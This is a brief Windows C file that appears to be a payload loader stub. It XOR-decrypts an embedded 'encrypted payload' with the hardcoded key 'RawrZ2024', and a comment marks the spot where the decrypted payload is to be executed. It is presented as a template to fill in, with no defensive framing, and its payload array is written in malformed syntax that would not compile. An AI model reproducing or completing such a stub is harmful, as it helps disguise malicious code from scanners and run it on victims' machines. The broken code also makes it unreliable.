
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>

void decrypt(char* data, size_t length, const char* key) {
    size_t key_len = strlen(key);
    for (size_t i = 0; i < length; ++i) {
        data[i] ^= key[i % key_len];
    }
}

int main() {
    // Your encrypted payload here
    char encrypted_payload[] = { 1a041b1e3512675d463e0556 };
    char* key = "RawrZ2024";
    
    decrypt(encrypted_payload, sizeof(encrypted_payload), key);
    
    // Execute the decrypted payload
    
    return 0;
}
